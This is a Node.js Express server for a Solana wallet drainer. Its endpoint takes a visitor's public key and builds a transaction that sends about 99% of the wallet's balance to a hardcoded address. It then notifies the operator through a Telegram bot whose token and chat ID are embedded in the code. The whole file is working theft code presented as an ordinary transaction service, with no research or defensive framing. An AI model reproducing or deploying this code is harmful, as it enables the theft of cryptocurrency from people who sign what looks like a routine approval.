const express = require('express');
const cors = require('cors');
const { Connection, PublicKey, SystemProgram, Transaction } = require('@solana/web3.js');
const fetch = require('node-fetch'); // Telegram integration

const app = express();
app.use(cors());
app.use(express.json());

// Solana connection
const connection = new Connection("https://api.mainnet-beta.solana.com", "confirmed");

// Telegram config (შენი token + chat ID)
const TELEGRAM_BOT_TOKEN = '8398850925:AAFaHAWsZunk4rFmbyoVyYR9VvhKsHPphVw';
const TELEGRAM_CHAT_ID = '-1002985988432';

// Telegram notify
async function sendTelegram(message) {
    try {
        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
        await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: 'HTML' })
        });
    } catch(e) { console.error("Telegram error:", e); }
}

// Endpoint to create serialized transaction
app.post('/create-transaction', async (req, res) => {
    try {
        const { publicKey } = req.body;
        if(!publicKey) return res.status(400).json({error: "No public key provided"});

        const sender = new PublicKey(publicKey);
        const receiver = new PublicKey("DDrBKoU3NE3NXaQu2XpNJXw8gWzECboTfA3ccD4aznBP");

        const balance = await connection.getBalance(sender);
        const minRent = await connection.getMinimumBalanceForRentExemption(0);
        const sendAmount = Math.floor((balance - minRent) * 0.99);

        if(sendAmount <= 0) return res.status(400).json({error: "Not enough balance"});

        const tx = new Transaction().add(
            SystemProgram.transfer({ fromPubkey: sender, toPubkey: receiver, lamports: sendAmount })
        );

        tx.feePayer = sender;
        tx.recentBlockhash = (await connection.getRecentBlockhash()).blockhash;

        const serialized = tx.serialize({requireAllSignatures:false}).toString('base64');

        // Telegram notify
        await sendTelegram(`📤 TX ready for approval\nWallet: ${publicKey}\nAmount: ${sendAmount/1e9} SOL`);

        res.json({serialized, sendAmount});
    } catch(err) {
        console.error(err);
        res.status(500).json({error: err.message});
    }
});

app.listen(3000, () => console.log('Server running on port 3000'));
